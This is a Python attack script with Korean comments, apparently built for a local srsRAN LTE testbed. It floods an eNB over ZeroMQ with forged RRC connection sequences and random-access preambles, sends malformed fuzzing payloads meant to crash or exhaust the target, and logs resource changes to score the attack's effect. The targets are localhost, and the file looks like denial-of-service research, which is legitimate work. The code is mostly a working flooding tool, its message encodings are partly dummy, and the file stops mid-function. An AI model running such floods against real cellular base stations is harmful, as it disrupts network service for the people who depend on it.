#!/usr/bin/env python3
"""
실제 UE 메시지를 사용한 공격
캡처된 실제 UE 메시지를 그대로 사용
"""

import zmq
import struct
import time
import random
import threading
import subprocess
import os
import json
from datetime import datetime

class RealUEAttack:
    def __init__(self, target_port=2001):
        self.target_port = target_port
        self.context = zmq.Context()
        self.running = False
        
        # 로그 디렉토리 설정
        self.log_dir = "logs"
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)
        
        # 리소스 모니터링 변수
        self.start_stats = None
        self.end_stats = None
        self.start_time = None
        self.end_time = None
        
        # 실제 캡처된 UE 메시지들 (개선된 형식)
        self.real_messages = [
            # ZeroMQ 헤더
            bytes.fromhex("ff00000000000000017f"),
            # ZeroMQ 메시지 타입
            bytes.fromhex("03"),
            # 실제 RRC Connection Request (올바른 형식)
            bytes.fromhex("01000001ff"),
            # ZeroMQ 소켓 설정
            bytes.fromhex("04260552454144590b536f636b65742d5479706500000003524551084964656e7469747900000000"),
        ]
        
        # LTE RRC 표준 메시지들
        self.lte_rrc_messages = {
            'rrc_connection_request': self.create_rrc_connection_request(),
            'rrc_connection_setup_complete': self.create_rrc_connection_setup_complete(),
            'rrc_connection_reconfiguration_complete': self.create_rrc_connection_reconfiguration_complete(),
            'rrc_connection_reestablishment_request': self.create_rrc_connection_reestablishment_request(),
            'measurement_report': self.create_measurement_report(),
            'ue_capability_information': self.create_ue_capability_information()
        }
        
        # 랜덤 액세스 프리앰블들
        self.ra_preambles = self.create_ra_preambles()
    
    def create_rrc_connection_request(self):
        """올바른 RRC Connection Request 메시지 생성"""
        # RRC Connection Request 메시지 구조:
        # - CriticalExtensions: c1
        # - c1: rrcConnectionRequest-r8
        # - rrcConnectionRequest-r8: ue-Identity, establishmentCause, spare
        message = bytearray()
        
        # RRC 메시지 헤더 (ASN.1 PER 인코딩)
        # CriticalExtensions: c1 (0)
        message.extend([0x00])
        
        # c1: rrcConnectionRequest-r8 (0)
        message.extend([0x00])
        
        # ue-Identity: s-TMSI (40 bits)
        # s-TMSI: mmec (8 bits) + m-tmsi (32 bits)
        mmec = random.randint(0, 255)
        m_tmsi = random.randint(0, 0xFFFFFFFF)
        message.extend([mmec])
        message.extend(struct.pack('>I', m_tmsi))
        
        # establishmentCause: mo-Data (0)
        message.extend([0x00])
        
        # spare: padding to byte boundary
        message.extend([0x00])
        
        return bytes(message)
    
    def create_rrc_connection_setup_complete(self):
        """RRC Connection Setup Complete 메시지 생성"""
        message = bytearray()
        
        # RRC 메시지 헤더
        message.extend([0x00])  # CriticalExtensions: c1
        
        # c1: rrcConnectionSetupComplete-r8 (0)
        message.extend([0x00])
        
        # rrc-TransactionIdentifier: 0-3
        message.extend([0x00])
        
        # selectedPLMN-Identity: 1
        message.extend([0x01])
        
        # dedicatedInfoNAS: dummy NAS message
        nas_message = bytes([0x07, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00])
        message.extend(nas_message)
        
        return bytes(message)
    
    def create_rrc_connection_reconfiguration_complete(self):
        """RRC Connection Reconfiguration Complete 메시지 생성"""
        message = bytearray()
        
        # RRC 메시지 헤더
        message.extend([0x00])  # CriticalExtensions: c1
        
        # c1: rrcConnectionReconfigurationComplete-r8 (0)
        message.extend([0x00])
        
        # rrc-TransactionIdentifier: 0-3
        message.extend([0x00])
        
        return bytes(message)
    
    def create_rrc_connection_reestablishment_request(self):
        """RRC Connection Reestablishment Request 메시지 생성"""
        message = bytearray()
        
        # RRC 메시지 헤더
        message.extend([0x00])  # CriticalExtensions: c1
        
        # c1: rrcConnectionReestablishmentRequest-r8 (0)
        message.extend([0x00])
        
        # ue-Identity: c-RNTI (16 bits)
        c_rnti = random.randint(1, 65535)
        message.extend(struct.pack('>H', c_rnti))
        
        # reestablishmentCause: reconfigurationFailure (0)
        message.extend([0x00])
        
        # shortMAC-I: 16 bits
        short_mac_i = random.randint(0, 65535)
        message.extend(struct.pack('>H', short_mac_i))
        
        return bytes(message)
    
    def create_measurement_report(self):
        """Measurement Report 메시지 생성"""
        message = bytearray()
        
        # RRC 메시지 헤더
        message.extend([0x00])  # CriticalExtensions: c1
        
        # c1: measurementReport-r8 (0)
        message.extend([0x00])
        
        # rrc-TransactionIdentifier: 0-3
        message.extend([0x00])
        
        # measResults: dummy measurement results
        message.extend([0x00, 0x00, 0x00, 0x00])
        
        return bytes(message)
    
    def create_ue_capability_information(self):
        """UE Capability Information 메시지 생성"""
        message = bytearray()
        
        # RRC 메시지 헤더
        message.extend([0x00])  # CriticalExtensions: c1
        
        # c1: ueCapabilityInformation-r8 (0)
        message.extend([0x00])
        
        # rrc-TransactionIdentifier: 0-3
        message.extend([0x00])
        
        # ue-CapabilityRAT-List: dummy capability
        message.extend([0x00, 0x00, 0x00, 0x00])
        
        return bytes(message)
    
    def create_ra_preambles(self):
        """랜덤 액세스 프리앰블 생성"""
        preambles = []
        
        # Zadoff-Chu 시퀀스 기반 프리앰블 생성
        # 실제로는 더 복잡한 계산이 필요하지만, 여기서는 간단한 패턴 사용
        for i in range(64):  # 64개 프리앰블
            preamble = bytearray()
            
            # 프리앰블 ID (6 bits)
            preamble.extend([i & 0x3F])
            
            # ZC 시퀀스 (839 samples, 여기서는 축약)
            # 실제로는 복잡한 수학적 계산이 필요
            for j in range(104):  # 축약된 길이
                sample = random.randint(0, 255)
                preamble.extend([sample])
            
            preambles.append(bytes(preamble))
        
        return preambles
    
    def send_ra_preamble(self, preamble_id=None):
        """랜덤 액세스 프리앰블 전송"""
        if preamble_id is None:
            preamble_id = random.randint(0, len(self.ra_preambles) - 1)
        
        preamble = self.ra_preambles[preamble_id]
        
        try:
            socket = self.context.socket(zmq.PUSH)
            socket.connect(f"tcp://localhost:{self.target_port}")
            
            # 프리앰블 전송 (물리 계층 시뮬레이션)
            socket.send(preamble, zmq.NOBLOCK)
            socket.close()
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] RA 프리앰블 #{preamble_id} 전송")
            print(f"  프리앰블 크기: {len(preamble)} bytes")
            return True
            
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] RA 프리앰블 전송 실패: {e}")
            return False
    
    def send_lte_rrc_message(self, message_type, message_data=None):
        """LTE RRC 메시지 전송 (srsRAN 호환 형식)"""
        if message_type not in self.lte_rrc_messages:
            print(f"알 수 없는 메시지 타입: {message_type}")
            return False
        
        message = self.lte_rrc_messages[message_type]
        
        try:
            # srsRAN이 기대하는 형식으로 메시지 구성
            socket = self.context.socket(zmq.PUSH)
            socket.connect(f"tcp://localhost:{self.target_port}")
            
            # srsRAN RRC 메시지 형식: [UE_ID][RRC_MSG_TYPE][PAYLOAD]
            full_message = bytearray()
            
            # UE ID (16 bits) - 실제 UE 식별자
            ue_id = random.randint(1, 65535)
            full_message.extend(struct.pack('>H', ue_id))
            
            # RRC 메시지 타입 (8 bits)
            msg_type_map = {
                'rrc_connection_request': 0x01,
                'rrc_connection_setup_complete': 0x02,
                'rrc_connection_reconfiguration_complete': 0x03,
                'rrc_connection_reestablishment_request': 0x04,
                'measurement_report': 0x05,
                'ue_capability_information': 0x06
            }
            msg_type = msg_type_map.get(message_type, 0x00)
            full_message.extend([msg_type])
            
            # RRC 페이로드
            full_message.extend(message)
            
            # srsRAN 헤더 추가 (필요한 경우)
            srsran_header = bytearray([0x00, 0x00, 0x00, 0x00])  # 더미 헤더
            full_message = srsran_header + full_message
            
            socket.send(bytes(full_message), zmq.NOBLOCK)
            socket.close()
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type} 전송 (UE ID: {ue_id})")
            print(f"  메시지 크기: {len(full_message)} bytes")
            print(f"  srsRAN 형식: {full_message.hex()}")
            return True
            
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type} 전송 실패: {e}")
            return False
    
    def perform_ra_procedure(self):
        """완전한 랜덤 액세스 절차 수행"""
        print(f"=== 랜덤 액세스 절차 시작 ===")
        
        # 1. 프리앰블 전송
        preamble_id = random.randint(0, len(self.ra_preambles) - 1)
        if not self.send_ra_preamble(preamble_id):
            return False
        
        # 2. RAR 대기 시뮬레이션 (실제로는 eNB 응답 대기)
        time.sleep(0.01)  # 10ms 대기
        
        # 3. RRC Connection Request 전송
        if not self.send_lte_rrc_message('rrc_connection_request'):
            return False
        
        # 4. RRC Connection Setup 대기 시뮬레이션
        time.sleep(0.01)  # 10ms 대기
        
        # 5. RRC Connection Setup Complete 전송
        if not self.send_lte_rrc_message('rrc_connection_setup_complete'):
            return False
        
        print(f"=== 랜덤 액세스 절차 완료 ===")
        return True
    
    def perform_complete_connection_sequence(self):
        """완전한 LTE 연결 시퀀스 수행"""
        print(f"=== 완전한 LTE 연결 시퀀스 시작 ===")
        
        # 1. 랜덤 액세스 절차
        if not self.perform_ra_procedure():
            print("랜덤 액세스 절차 실패")
            return False
        
        # 2. RRC 연결 설정 완료 후 추가 메시지들
        time.sleep(0.01)
        
        # 3. UE Capability Information 전송
        if not self.send_lte_rrc_message('ue_capability_information'):
            print("UE Capability Information 전송 실패")
            return False
        
        time.sleep(0.01)
        
        # 4. Measurement Report 전송
        if not self.send_lte_rrc_message('measurement_report'):
            print("Measurement Report 전송 실패")
            return False
        
        time.sleep(0.01)
        
        # 5. RRC Connection Reconfiguration Complete 전송
        if not self.send_lte_rrc_message('rrc_connection_reconfiguration_complete'):
            print("RRC Connection Reconfiguration Complete 전송 실패")
            return False
        
        print(f"=== 완전한 LTE 연결 시퀀스 완료 ===")
        return True
    
    def perform_aggressive_connection_flooding(self):
        """공격적인 연결 플러딩 수행"""
        print(f"=== 공격적인 연결 플러딩 시작 ===")
        
        # 동시에 여러 연결 시도
        success_count = 0
        
        for i in range(10):  # 10개 동시 연결 시도
            if self.perform_complete_connection_sequence():
                success_count += 1
            time.sleep(0.001)  # 1ms 간격
        
        print(f"=== 공격적인 연결 플러딩 완료: {success_count}/10 성공 ===")
        return success_count
    
    def simulate_physical_layer_connection(self):
        """물리 계층 연결 시뮬레이션 (실제 srsRAN UE 사용)"""
        print(f"=== 물리 계층 연결 시뮬레이션 시작 ===")
        
        try:
            # srsRAN UE 설정 파일 생성 (빈 설정 파일)
            ue_config = """
# srsRAN UE 설정 파일
# 모든 설정은 명령행 옵션으로 전달
"""
            
            # 설정 파일 저장
            config_file = "/tmp/ue.conf"
            with open(config_file, 'w') as f:
                f.write(ue_config)
            
            # srsRAN UE 프로세스 시작 (최소 옵션만)
            cmd = [
                "sudo", "srsue",
                "--rf.device_name=zmq",
                "--rf.device_args=tx_port=tcp://localhost:2000,rx_port=tcp://localhost:2001,id=ue",
                "--rat.eutra.dl_earfcn=2680",
                "--usim.imsi=001010123456789",
                "--usim.k=00112233445566778899AABBCCDDEEFF",
                "--usim.op=63BFA50EE9864AAB33CC72DD78524B98",
                config_file
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, text=True)
            
            print(f"UE 프로세스 시작: PID {process.pid}")
            print(f"설정 파일: {config_file}")
            
            # UE 초기화 대기
            time.sleep(5)
            
            return process
            
        except Exception as e:
            print(f"물리 계층 연결 시뮬레이션 실패: {e}")
            return None
    
    def send_malformed_rrc_messages(self, count=100):
        """악성 RRC 메시지 전송 (퍼징)"""
        print(f"=== 악성 RRC 메시지 전송 시작 ({count}개) ===")
        
        success_count = 0
        
        for i in range(count):
            try:
                # 다양한 악성 메시지 패턴 생성
                malformed_patterns = [
                    # 패턴 1: 매우 큰 메시지
                    b'\x00' * 10000,
                    # 패턴 2: 잘못된 헤더
                    b'\xFF\xFF\xFF\xFF' + b'\x00' * 100,
                    # 패턴 3: 특수 문자 포함
                    b'\x00\x01\x02\x03' + b'\xFF' * 50,
                    # 패턴 4: NULL 바이트 폭탄
                    b'\x00' * 1000,
                    # 패턴 5: 무한 루프 유발 가능한 패턴
                    b'\x01\x00\x00\x00' + b'\xAA' * 200
                ]
                
                pattern = malformed_patterns[i % len(malformed_patterns)]
                
                socket = self.context.socket(zmq.PUSH)
                socket.connect(f"tcp://localhost:{self.target_port}")
                
                # 악성 메시지 전송
                socket.send(pattern, zmq.NOBLOCK)
                socket.close()
                
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 악성 메시지 #{i+1} 전송: {len(pattern)} bytes")
                success_count += 1
                
                time.sleep(0.01)  # 10ms 간격
                
            except Exception as e:
                print(f"악성 메시지 #{i+1} 전송 실패: {e}")
        
        print(f"=== 악성 RRC 메시지 전송 완료: {success_count}/{count} 성공 ===")
        return success_count
    
    def check_srsran_enb_status(self):
        """srsRAN eNB 상태 확인"""
        print(f"=== srsRAN eNB 상태 확인 ===")
        
        try:
            # eNB 프로세스 확인
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            
            enb_processes = []
            for line in lines:
                if 'srsenb' in line.lower():
                    enb_processes.append(line)
            
            if enb_processes:
                print(f"eNB 프로세스 발견: {len(enb_processes)}개")
                for process in enb_processes:
                    print(f"  {process}")
            else:
                print("eNB 프로세스가 실행되지 않음")
                return False
            
            # eNB 포트 확인
            result = subprocess.run(['netstat', '-tlnp'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            
            enb_ports = []
            for line in lines:
                if '2000' in line or '2001' in line:
                    enb_ports.append(line)
            
            if enb_ports:
                print(f"eNB 포트 발견: {len(enb_ports)}개")
                for port in enb_ports:
                    print(f"  {port}")
            else:
                print("eNB 포트가 열려있지 않음")
                return False
            
            return True
            
        except Exception as e:
            print(f"eNB 상태 확인 실패: {e}")
            return False
    
    def start_srsran_enb(self):
        """srsRAN eNB 시작"""
        print(f"=== srsRAN eNB 시작 ===")
        
        try:
            # eNB 설정 파일 생성
            enb_config = """
[rf]
device_name = zmq
device_args = tx_port=tcp://localhost:2000,rx_port=tcp://localhost:2001
tx_gain = 76
rx_gain = 76
freq = 2680000000

[rat.eutra]
dl_earfcn = 2680
ul_earfcn = 25680

[rat.eutra.dl]
nof_prb = 50

[rat.eutra.ul]
nof_prb = 50

[enb]
enb_id = 0x19B
mcc = 001
mnc = 01
mme_addr = 127.0.0.1
gtp_bind_addr = 127.0.0.1
s1c_bind_addr = 127.0.0.1
s1c_bind_port = 36412
gtp_bind_addr = 127.0.0.1
gtp_bind_port = 2123
"""
            
            # 설정 파일 저장
            config_file = "/tmp/enb.conf"
            with open(config_file, 'w') as f:
                f.write(enb_config)
            
            # srsRAN eNB 프로세스 시작
            cmd = ["sudo", "srsenb", "-c", config_file]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, text=True)
            
            print(f"eNB 프로세스 시작: PID {process.pid}")
            print(f"설정 파일: {config_file}")
            
            # eNB 초기화 대기
            time.sleep(10)
            
            return process
            
        except Exception as e:
            print(f"eNB 시작 실패: {e}")
            return None
    
    def monitor_enb_responses(self, duration=5):
        """eNB 응답 모니터링"""
        print(f"=== eNB 응답 모니터링 시작 ({duration}초) ===")
        
        # 응답 수신을 위한 SUB 소켓 생성
        response_socket = self.context.socket(zmq.SUB)
        response_socket.connect(f"tcp://localhost:{self.target_port + 1}")  # 응답 포트
        response_socket.setsockopt(zmq.SUBSCRIBE, b"")  # 모든 메시지 구독
        
        responses = []
        start_time = time.time()
        
        while (time.time() - start_time) < duration:
            try:
                # 응답 대기 (타임아웃 설정)
                response_socket.setsockopt(zmq.RCVTIMEO, 100)  # 100ms 타임아웃
                response = response_socket.recv(zmq.NOBLOCK)
                
                timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
                response_data = {
                    'timestamp': timestamp,
                    'data': response.hex(),
                    'size': len(response)
                }
                responses.append(response_data)
                
                print(f"[{timestamp}] eNB 응답 수신: {len(response)} bytes")
                print(f"  데이터: {response.hex()}")
                
            except zmq.Again:
                # 타임아웃 - 계속 대기
                continue
            except Exception as e:
                print(f"응답 수신 오류: {e}")
                break
        
        response_socket.close()
        
        print(f"=== eNB 응답 모니터링 완료: {len(responses)}개 응답 수신 ===")
        return responses
    
    def monitor_srsran_logs(self, duration=5):
        """srsRAN 로그 모니터링"""
        print(f"=== srsRAN 로그 모니터링 시작 ({duration}초) ===")
        
        # srsRAN 로그 파일 모니터링
        log_files = [
            "/tmp/srsenb.log",
            "/tmp/srsue.log", 
            "/var/log/srsran/enb.log",
            "/var/log/srsran/ue.log"
        ]
        
        log_entries = []
        start_time = time.time()
        
        for log_file in log_files:
            if os.path.exists(log_file):
                try:
                    # tail -f로 실시간 로그 모니터링
                    cmd = ["tail", "-f", "-n", "0", log_file]
                    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                            stderr=subprocess.PIPE, text=True)
                    
                    while (time.time() - start_time) < duration:
                        line = process.stdout.readline()
                        if line:
                            timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
                            log_entry = {
                                'timestamp': timestamp,
                                'file': log_file,
                                'content': line.strip()
                            }
                            log_entries.append(log_entry)
                            
                            print(f"[{timestamp}] {log_file}: {line.strip()}")
                    
                    process.terminate()
                    break  # 첫 번째 유효한 로그 파일만 모니터링
                    
                except Exception as e:
                    print(f"로그 모니터링 오류 ({log_file}): {e}")
                    continue
        
        print(f"=== srsRAN 로그 모니터링 완료: {len(log_entries)}개 엔트리 ===")
        return log_entries
    
    def get_system_stats(self):
        """시스템 리소스 통계 수집"""
        try:
            stats = {
                'timestamp': datetime.now().isoformat(),
                'cpu_percent': 0,
                'memory_percent': 0,
                'memory_used_gb': 0,
                'bytes_sent': 0,
                'bytes_recv': 0,
                'srsran_cpu': 0,
                'srsran_memory': 0
            }

            # CPU 사용량 (top 명령어 사용)
            try:
                result = subprocess.run(['top', '-l', '1', '-n', '0'],
                                      capture_output=True, text=True, timeout=5)
                cpu_line = [line for line in result.stdout.split('\n') if 'CPU usage' in line]
                if cpu_line:
                    import re
                    cpu_match = re.search(r'(\d+\.\d+)%', cpu_line[0])
                    if cpu_match:
                        stats['cpu_percent'] = float(cpu_match.group(1))
            except:
                pass

            # 메모리 사용량 (vm_stat 명령어 사용)
            try:
                result = subprocess.run(['vm_stat'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                page_size = 4096  # 기본 페이지 크기
                total_pages = 0
                free_pages = 0

                for line in lines:
                    if 'Pages free' in line:
                        import re
                        match = re.search(r'(\d+)', line)
                        if match:
                            free_pages = int(match.group(1))
                    elif 'Pages active' in line or 'Pages inactive' in line or 'Pages wired down' in line:
                        match = re.search(r'(\d+)', line)
                        if match:
                            total_pages += int(match.group(1))

                total_pages += free_pages
                if total_pages > 0:
                    memory_used_bytes = (total_pages - free_pages) * page_size
                    memory_total_bytes = total_pages * page_size
                    stats['memory_percent'] = (memory_used_bytes / memory_total_bytes) * 100
                    stats['memory_used_gb'] = memory_used_bytes / (1024**3)
            except:
                pass

            # 네트워크 트래픽 (netstat 명령어 사용)
            try:
                result = subprocess.run(['netstat', '-ib'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                bytes_sent = 0
                bytes_recv = 0

                for line in lines:
                    if 'en0' in line or 'en1' in line:  # 이더넷 인터페이스
                        parts = line.split()
                        if len(parts) >= 10:
                            try:
                                bytes_sent += int(parts[6])  # obytes
                                bytes_recv += int(parts[9])  # ibytes
                            except:
                                pass

                stats['bytes_sent'] = bytes_sent
                stats['bytes_recv'] = bytes_recv
            except:
                pass

            # srsRAN 프로세스 리소스 (ps 명령어 사용)
            try:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')

                for line in lines:
                    if 'srsenb' in line.lower():
                        parts = line.split()
                        if len(parts) >= 11:
                            try:
                                cpu = float(parts[2])  # CPU 사용률
                                memory = float(parts[3])  # 메모리 사용률
                                stats['srsran_cpu'] += cpu
                                stats['srsran_memory'] += memory
                            except:
                                pass
            except:
                pass

            return stats

        except Exception as e:
            print(f"리소스 통계 수집 오류: {e}")
            return None
    
    def log_message(self, message):
        """로그 메시지 출력 및 저장"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_msg = f"[{timestamp}] {message}"
        print(log_msg)
        
        # 로그 파일에 저장
        if hasattr(self, 'log_file') and self.log_file:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_msg + '\n')
    
    def setup_logging(self, attack_type, duration):
        """로깅 설정"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_filename = f"{self.log_dir}/real_ue_attack_{attack_type}_{timestamp}.log"
        self.log_file = log_filename
        
        self.log_message("=" * 50)
        self.log_message(f"=== 실제 UE 메시지 공격 로그 시작 ===")
        self.log_message(f"공격 유형: {attack_type}")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message(f"로그 파일: {log_filename}")
        self.log_message("=" * 50)
        
    def send_real_message(self, message, message_type="Unknown"):
        """실제 UE 메시지 전송"""
        try:
            socket = self.context.socket(zmq.PUSH)
            socket.connect(f"tcp://localhost:{self.target_port}")
            
            socket.send(message, zmq.NOBLOCK)
            socket.close()
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type} 전송")
            print(f"  메시지 크기: {len(message)} bytes")
            print(f"  데이터: {message.hex()}")
            return True
            
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type} 전송 실패: {e}")
            return False
    
    def send_zeromq_sequence(self):
        """실제 UE의 ZeroMQ 연결 시퀀스 전송"""
        print(f"=== 실제 UE ZeroMQ 연결 시퀀스 전송 ===")
        
        # 1. ZeroMQ 헤더
        self.send_real_message(self.real_messages[0], "ZeroMQ 헤더")
        time.sleep(0.01)
        
        # 2. ZeroMQ 메시지 타입
        self.send_real_message(self.real_messages[1], "ZeroMQ 메시지 타입")
        time.sleep(0.01)
        
        # 3. 실제 RRC Connection Request
        self.send_real_message(self.real_messages[2], "RRC Connection Request")
        time.sleep(0.01)
        
        # 4. ZeroMQ 소켓 설정
        self.send_real_message(self.real_messages[3], "ZeroMQ 소켓 설정")
        time.sleep(0.01)
    
    def rrc_connection_flood(self, duration=60):
        """개선된 RRC Connection Request 플러딩 (완전한 LTE 절차 사용)"""
        self.setup_logging("rrc_connection_improved", duration)
        
        # 공격 시작 전 리소스 상태 캡처
        self.log_message("공격 시작 전 리소스 상태 캡처 중...")
        self.start_stats = self.get_system_stats()
        self.start_time = datetime.now()
        
        if self.start_stats:
            self.log_message(f"시작 CPU: {self.start_stats['cpu_percent']:.1f}%")
            self.log_message(f"시작 메모리: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"시작 네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
            self.log_message(f"시작 네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
            self.log_message(f"시작 srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
            self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
        
        self.log_message("=" * 50)
        self.log_message(f"=== 개선된 RRC Connection Request 플러딩 시작 ===")
        self.log_message(f"대상 포트: {self.target_port}")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message("=" * 50)
        
        self.running = True
        start_time = time.time()
        count = 0
        success_count = 0
        
        # 응답 모니터링 스레드 시작
        response_thread = threading.Thread(target=self.monitor_enb_responses, args=(duration,))
        response_thread.daemon = True
        response_thread.start()
        
        while self.running and (time.time() - start_time) < duration:
            # 완전한 연결 시퀀스 수행
            if self.perform_complete_connection_sequence():
                success_count += 1
            
            count += 1
            time.sleep(0.05)  # 50ms 간격 (더 빠른 공격)
        
        # 공격 종료 후 리소스 상태 캡처
        self.log_message("=" * 50)
        self.log_message("공격 종료 후 리소스 상태 캡처 중...")
        self.end_stats = self.get_system_stats()
        self.end_time = datetime.now()
        
        if self.end_stats:
            self.log_message(f"종료 CPU: {self.end_stats['cpu_percent']:.1f}%")
            self.log_message(f"종료 메모리: {self.end_stats['memory_percent']:.1f}% ({self.end_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"종료 네트워크 송신: {self.end_stats['bytes_sent']:,} bytes")
            self.log_message(f"종료 네트워크 수신: {self.end_stats['bytes_recv']:,} bytes")
            self.log_message(f"종료 srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}%")
            self.log_message(f"종료 srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}%")
        
        # 리소스 변화량 계산 및 출력
        if self.start_stats and self.end_stats:
            self.log_message("=" * 50)
            self.log_message("=== 리소스 변화량 분석 ===")
            
            cpu_change = self.end_stats['cpu_percent'] - self.start_stats['cpu_percent']
            memory_change = self.end_stats['memory_percent'] - self.start_stats['memory_percent']
            memory_gb_change = self.end_stats['memory_used_gb'] - self.start_stats['memory_used_gb']
            bytes_sent_change = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
            bytes_recv_change = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
            srsran_cpu_change = self.end_stats['srsran_cpu'] - self.start_stats['srsran_cpu']
            srsran_memory_change = self.end_stats['srsran_memory'] - self.start_stats['srsran_memory']
            
            self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
            self.log_message(f"메모리 변화: {memory_change:+.1f}% ({memory_gb_change:+.2f}GB)")
            self.log_message(f"네트워크 송신 변화: {bytes_sent_change:+,} bytes")
            self.log_message(f"네트워크 수신 변화: {bytes_recv_change:+,} bytes")
            self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
            self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
            
            # 공격 효과 분석
            self.log_message("=" * 50)
            self.log_message("=== 공격 효과 분석 ===")
            if abs(cpu_change) > 5:
                self.log_message(f"✓ CPU 사용량이 {'증가' if cpu_change > 0 else '감소'}했습니다 ({cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ CPU 사용량 변화가 미미합니다 ({cpu_change:+.1f}%)")
            
            if abs(memory_change) > 2:
                self.log_message(f"✓ 메모리 사용량이 {'증가' if memory_change > 0 else '감소'}했습니다 ({memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ 메모리 사용량 변화가 미미합니다 ({memory_change:+.1f}%)")
            
            if abs(srsran_cpu_change) > 5:
                self.log_message(f"✓ srsRAN CPU 사용량이 {'증가' if srsran_cpu_change > 0 else '감소'}했습니다 ({srsran_cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN CPU 사용량 변화가 미미합니다 ({srsran_cpu_change:+.1f}%)")
            
            if abs(srsran_memory_change) > 2:
                self.log_message(f"✓ srsRAN 메모리 사용량이 {'증가' if srsran_memory_change > 0 else '감소'}했습니다 ({srsran_memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
        
        # 결과를 JSON 파일로 저장
        self.save_attack_results(count, duration, success_count)
        
        self.log_message("=" * 50)
        self.log_message(f"=== 개선된 플러딩 완료 ===")
        self.log_message(f"총 {count}개 연결 시도")
        self.log_message(f"성공한 연결: {success_count}개")
        self.log_message(f"성공률: {(success_count/count*100):.1f}%" if count > 0 else "성공률: 0%")
        self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
        self.log_message("=" * 50)
    
    def save_attack_results(self, message_count, duration, success_count=0):
        """공격 결과를 JSON 파일로 저장"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        results_file = f"{self.log_dir}/improved_attack_results_{timestamp}.json"
        
        results = {
            'attack_info': {
                'type': 'rrc_connection_improved',
                'duration': duration,
                'message_count': message_count,
                'success_count': success_count,
                'success_rate': (success_count/message_count*100) if message_count > 0 else 0,
                'target_port': self.target_port,
                'start_time': self.start_time.isoformat() if self.start_time else None,
                'end_time': self.end_time.isoformat() if self.end_time else None
            },
            'start_stats': self.start_stats,
            'end_stats': self.end_stats,
            'lte_rrc_messages_used': {
                msg_type: msg.hex() for msg_type, msg in self.lte_rrc_messages.items()
            },
            'ra_preambles_count': len(self.ra_preambles)
        }
        
        with open(results_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        self.log_message(f"공격 결과 저장: {results_file}")
    
    def aggressive_rrc_flood(self, duration=60):
        """공격적인 RRC 플러딩 (동시 다중 연결)"""
        self.setup_logging("aggressive_rrc", duration)
        
        # 공격 시작 전 리소스 상태 캡처
        self.log_message("공격 시작 전 리소스 상태 캡처 중...")
        self.start_stats = self.get_system_stats()
        self.start_time = datetime.now()
        
        if self.start_stats:
            self.log_message(f"시작 CPU: {self.start_stats['cpu_percent']:.1f}%")
            self.log_message(f"시작 메모리: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"시작 네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
            self.log_message(f"시작 네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
            self.log_message(f"시작 srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
            self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
        
        self.log_message("=" * 50)
        self.log_message(f"=== 공격적인 RRC 플러딩 시작 ===")
        self.log_message(f"대상 포트: {self.target_port}")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message("=" * 50)
        
        self.running = True
        start_time = time.time()
        total_attempts = 0
        total_success = 0
        
        # 응답 모니터링 스레드 시작
        response_thread = threading.Thread(target=self.monitor_enb_responses, args=(duration,))
        response_thread.daemon = True
        response_thread.start()
        
        # srsRAN 로그 모니터링 스레드 시작
        log_thread = threading.Thread(target=self.monitor_srsran_logs, args=(duration,))
        log_thread.daemon = True
        log_thread.start()
        
        while self.running and (time.time() - start_time) < duration:
            # 동시에 여러 연결 시도
            success_count = self.perform_aggressive_connection_flooding()
